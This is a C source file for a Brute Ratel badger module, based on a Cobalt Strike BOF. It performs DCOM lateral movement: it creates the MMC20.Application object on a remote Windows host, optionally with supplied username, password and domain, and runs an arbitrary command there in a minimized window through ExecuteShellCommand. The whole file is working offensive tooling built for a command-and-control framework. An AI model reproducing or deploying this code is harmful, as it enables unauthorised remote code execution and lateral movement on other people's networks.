// based on https://yaxser.github.io/CobaltStrike-BOF/

#include <windows.h>
#include <stdio.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <combaseapi.h>
#include <heapapi.h>
#include <stringapiset.h>
#include <guiddef.h>
#include "badger_exports.h"


DECLSPEC_IMPORT WINOLEAPI OLE32$CoInitialize(LPVOID pvReserved);
DECLSPEC_IMPORT WINOLEAPI OLE32$CLSIDFromString(LPCOLESTR lpsz, LPCLSID pclsid);
DECLSPEC_IMPORT WINOLEAPI OLE32$CoCreateInstance(REFCLSID, IUnknown*, DWORD, REFIID, LPVOID);
DECLSPEC_IMPORT WINOLEAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI*);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
DECLSPEC_IMPORT WINOLEAPI_(void) OLE32$CoUninitialize(void);
DECLSPEC_IMPORT WINOLEAUTAPI_(BSTR) OleAut32$SysAllocString(const OLECHAR*);
DECLSPEC_IMPORT WINOLEAUTAPI_(BSTR) OleAut32$SysFreeString(BSTR);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, CHAR*, INT, LPWSTR, INT);

wchar_t* createWStr(char* str) {
	int length = KERNEL32$MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
	wchar_t* wstr = (wchar_t*)BadgerAlloc(length * sizeof(wchar_t));
	KERNEL32$MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, length);
	return wstr;
}

void coffee(char** argv, int argc, WCHAR** dispatch) {

	BadgerDispatchW(dispatch, L"Start\n");

	if (argc < 2) {
		BadgerDispatch(dispatch, "Target or command missing!\nUsage: coffexec dcom.o <target> <command> <arguments> <username> <password> <domain>\n");
		return;
	}

	wchar_t* bwcommand = createWStr(argv[1]);
	wchar_t* bwtarget = createWStr(argv[0]);
	wchar_t* bwparameters;

	if (argc < 3) {
		BadgerDispatch(dispatch, "No arguments found!\n");
		bwparameters = createWStr("");
	} else {
		bwparameters = createWStr(argv[2]);
	}

	BadgerDispatchW(dispatch, L"target: %ls\n", bwtarget);
	BadgerDispatchW(dispatch, L"command: %ls\n", bwcommand);
	BadgerDispatchW(dispatch, L"args: %ls\n", bwparameters);

	HRESULT hr = S_OK;
	IID Ipsb, Ipsv, Ipsw, Ipsfvd, Ipdisp, IpdispBackground, ISHLDISP, IshellWindowCLSID, ITopLevelSID, servicerprovider_iid;
	HWND hwnd;
	IShellBrowser* psb;
	IShellView* psv;
	IShellWindows* psw;
	IShellFolderViewDual* psfvd;
	IShellDispatch2* psd;
	IDispatch* pdisp, * pdispBackground;
	IServiceProvider* svsProvider;
	VARIANT vEmpty = { vEmpty.vt = VT_I4, vEmpty.lVal = 0 };


	COAUTHIDENTITY* authidentity = NULL;
	if (argc >= 6) {
		wchar_t* bwusername = createWStr(argv[3]);
		wchar_t* bwpassword = createWStr(argv[4]);
		wchar_t* bwdomain = createWStr(argv[5]);
		BadgerDispatchW(dispatch, L"domain: %s\n", bwdomain);
		BadgerDispatchW(dispatch, L"username: %s\n", bwusername);
		BadgerDispatchW(dispatch, L"password: %s\n", bwpassword);
		authidentity = BadgerAlloc(sizeof(COAUTHIDENTITY));
		authidentity->User = bwusername;
		authidentity->Password = bwpassword;
		authidentity->Domain = bwdomain;
		authidentity->UserLength = BadgerWcslen(authidentity->User);
		authidentity->PasswordLength = BadgerWcslen(authidentity->Password);
		authidentity->DomainLength = BadgerWcslen(authidentity->Domain);
		authidentity->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
	}


	COAUTHINFO* authInfo = BadgerAlloc(sizeof(COAUTHINFO));
	authInfo->dwAuthnSvc = RPC_C_AUTHN_WINNT;
	authInfo->dwAuthzSvc = RPC_C_AUTHZ_NONE;
	authInfo->pwszServerPrincName = NULL;
	authInfo->dwAuthnLevel = RPC_C_AUTHN_LEVEL_DEFAULT;
	authInfo->dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
	authInfo->pAuthIdentityData = authidentity;
	authInfo->dwCapabilities = EOAC_NONE;

	COSERVERINFO* srvinfo = BadgerAlloc(sizeof(COSERVERINFO));;
	srvinfo->dwReserved1 = 0;
	srvinfo->dwReserved2 = 0;
	srvinfo->pwszName = bwtarget;
	srvinfo->pAuthInfo = authInfo;

	//Initializing COM
	hr = OLE32$CoInitialize(NULL);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"CoInitialize failed: 0x%08lx", hr);
		return;
	}

	wchar_t* MMC20_CLSID = L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}";
	CLSID clsid;
	hr = OLE32$CLSIDFromString(MMC20_CLSID, &clsid);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"CLSIDFromString failed: 0x%08lx", hr);
		return;
	}

	IID ApplicationIID;
	hr = OLE32$IIDFromString(L"{A3AFB9CC-B653-4741-86AB-F0470EC1384C}", &ApplicationIID);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"IIDFromString failed: 0x%08lx", hr);
		return;
	}

	MULTI_QI mqi[1] = { &ApplicationIID, NULL, 0 };
	hr = OLE32$CoCreateInstanceEx(&clsid, NULL, CLSCTX_REMOTE_SERVER, srvinfo, 1, mqi);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"CoCreateInstanceEx failed: 0x%08lx", hr);
		return;
	}

	DISPPARAMS dp = { NULL, NULL, 0, 0 };
	VARIANT* vDocIfc = BadgerAlloc(sizeof(VARIANT));
	IID NULL_IID;
	hr = OLE32$IIDFromString(L"{00000000-0000-0000-0000-000000000000}", &NULL_IID);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"IIDFromString failed: 0x%08lx", hr);
		return;
	}

	IDispatch* ApplicationIfc = (IDispatch *)mqi->pItf;
	hr = ((IDispatchVtbl*)(mqi->pItf->lpVtbl))->Invoke(ApplicationIfc, (LONG)4, &NULL_IID, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vDocIfc, NULL, 0);
	ApplicationIfc->lpVtbl->Release(ApplicationIfc);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"ApplicationIfc failed: 0x%08lx", hr);
		return;
	}

	VARIANT* vViewIfc = BadgerAlloc(sizeof(VARIANT));
	BSTR szMember = OleAut32$SysAllocString(L"ActiveView");
	DISPID dpid;

	IID IID_IDISPATCH;
	OLE32$IIDFromString(L"{00020400-0000-0000-C000-000000000046}", &IID_IDISPATCH);

	hr = vDocIfc->pdispVal->lpVtbl->GetIDsOfNames(vDocIfc->pdispVal, &IID_IDISPATCH, &szMember, 1, LOCALE_SYSTEM_DEFAULT, &dpid);
	hr = vDocIfc->pdispVal->lpVtbl->Invoke(vDocIfc->pdispVal, dpid, &NULL_IID, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &dp, vViewIfc, NULL, 0);
	vDocIfc->pdispVal->lpVtbl->Release(vDocIfc->pdispVal);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"ApplicationIfc failed: 0x%08lx", hr);
		return;
	}

	VARIANT vCmd;
	vCmd.vt = VT_BSTR;
	vCmd.bstrVal = OleAut32$SysAllocString(bwcommand);

	VARIANT vDir;
	vDir.vt = VT_BSTR;
	vDir.bstrVal = OleAut32$SysAllocString(L"");


	VARIANT vArgs;
	vArgs.vt = VT_BSTR;
	vArgs.bstrVal = OleAut32$SysAllocString(bwparameters);

	VARIANT vShow;
	vShow.vt = VT_BSTR;
	vShow.bstrVal = OleAut32$SysAllocString(L"Minimized");

	DISPPARAMS params = { NULL, NULL, 0, 0 };
	//Add the variants we created to the params.
	VARIANT varr[4] = { vShow, vArgs, vDir, vCmd };
	params.rgvarg = varr;
	params.cArgs = 4;
	params.rgdispidNamedArgs = 0;
	params.cNamedArgs = 0;

	VARIANT res;
	hr = vViewIfc->pdispVal->lpVtbl->Invoke(vViewIfc->pdispVal, (LONG)54, &NULL_IID, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &params, &res, NULL, 0);
	vViewIfc->pdispVal->lpVtbl->Release(vViewIfc->pdispVal);
	if (!SUCCEEDED(hr)) {
		BadgerDispatchW(dispatch, L"vViewIfc failed: 0x%08lx", hr);
		return;
	}

	OleAut32$SysFreeString(vCmd.bstrVal);
	OleAut32$SysFreeString(vDir.bstrVal);
	OleAut32$SysFreeString(vArgs.bstrVal);
	OleAut32$SysFreeString(vShow.bstrVal);
	OleAut32$SysFreeString(szMember);
	BadgerFree((PVOID*)&srvinfo);
	if (argc >= 6) {
		BadgerFree((PVOID*)&authidentity);
	}
	BadgerFree((PVOID*)&authInfo);
	BadgerFree((PVOID*)&bwcommand);
	BadgerFree((PVOID*)&bwtarget);
	BadgerFree((PVOID*)&bwparameters);
	BadgerFree((PVOID*)&vViewIfc);

	BadgerDispatchW(dispatch, L"Done\n");
}
